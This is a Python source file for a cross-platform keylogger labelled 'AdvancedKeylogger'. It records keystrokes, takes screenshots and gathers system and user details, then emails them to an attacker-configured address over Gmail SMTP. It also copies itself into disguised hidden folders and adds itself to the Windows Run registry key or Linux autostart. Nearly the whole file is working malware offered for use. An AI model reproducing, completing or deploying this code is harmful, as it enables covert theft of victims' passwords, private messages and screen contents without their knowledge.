import keyboard
import socket
import os
import platform
import smtplib
import base64
import shutil
import getpass
from threading import Semaphore, Timer
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet

if platform.system() == "Windows":
    import winreg as reg
    import pyscreenshot as ImageGrab
elif platform.system() == "Linux":
    import pyscreenshot as ImageGrab
elif platform.system() == "Darwin":
    from pynput.keyboard import Listener
    from PIL import ImageGrab

SEND_REPORT_EVERY = 900  # 15 minutes
EMAIL_ADDRESS = ""  # Enter Email
EMAIL_PASSWORD = ""  # Enter Password

# Encryption key generation
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)

class AdvancedKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def encrypt_log(self, log):
        return CIPHER.encrypt(log.encode())

    def callback(self, event):
        try:
            name = event.name
        except AttributeError:
            name = event.char
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    @staticmethod
    def sendmail(email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    @staticmethod
    def send_image(img_filename):
        img_data = open(img_filename, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        text = MIMEText("Screenshot attached.")
        msg.attach(text)
        image = MIMEImage(img_data, name=os.path.basename(img_filename))
        msg.attach(image)

        s = smtplib.SMTP(host="smtp.gmail.com", port=587)
        s.starttls()
        s.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        s.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        s.quit()

    def screenshot(self):
        im = ImageGrab.grab()
        cwd = os.getcwd()
        path = os.path.join(cwd, "screenshot.png")
        im.save(path)
        self.send_image(path)
        os.remove(path)

    def report(self):
        self.screenshot()
        if self.log:
            encrypted_log = self.encrypt_log(self.log)
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, encrypted_log.decode())
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def computer_info(self):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        user = getpass.getuser()

        mssg = f"""
        System Information
        ------------------
        User: {user}
        Architecture: {platform.architecture()[0]} {platform.architecture()[1]}
        Machine: {platform.machine()}
        System: {platform.system()} {platform.version()}
        Hostname: {hostname}
        IP Address: {IPAddr}
        """

        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, mssg)

    def add_to_startup(self, file_path):
        if platform.system() == "Windows":
            try:
                key = reg.HKEY_CURRENT_USER
                key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
                open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
                reg.SetValueEx(open_key, "AdvancedKeylogger", 0, reg.REG_SZ, file_path)
                reg.CloseKey(open_key)
            except Exception as e:
                print(f"Error adding to startup: {e}")
        elif platform.system() == "Linux" or platform.system() == "Darwin":
            try:
                with open(os.path.expanduser("~/.config/autostart/AdvancedKeylogger.desktop"), "w") as file:
                    file.write(f"[Desktop Entry]\nType=Application\nExec={file_path}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=AdvancedKeylogger\n")
            except Exception as e:
                print(f"Error adding to startup: {e}")

    def hide_script(self):
        try:
            if platform.system() == "Windows":
                hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsService')
                if not os.path.exists(hidden_dir):
                    os.makedirs(hidden_dir)
                script_name = os.path.basename(__file__)
                hidden_path = os.path.join(hidden_dir, script_name)
                shutil.copyfile(__file__, hidden_path)
                self.add_to_startup(hidden_path)
            elif platform.system() == "Linux" or platform.system() == "Darwin":
                hidden_dir = os.path.expanduser("~/.local/share/.hidden")
                if not os.path.exists(hidden_dir):
                    os.makedirs(hidden_dir)
                script_name = os.path.basename(__file__)
                hidden_path = os.path.join(hidden_dir, script_name)
                shutil.copyfile(__file__, hidden_path)
                self.add_to_startup(hidden_path)
        except Exception as e:
            print(f"Error hiding script: {e}")

    def start(self):
        self.hide_script()
        if platform.system() == "Windows" or platform.system() == "Linux":
            keyboard.on_release(callback=self.callback)
        elif platform.system() == "Darwin":
            with Listener(on_press=self.callback) as listener:
                self.computer_info()
                self.report()
                listener.join()
        else:
            self.computer_info()
            self.report()
            self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = AdvancedKeylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
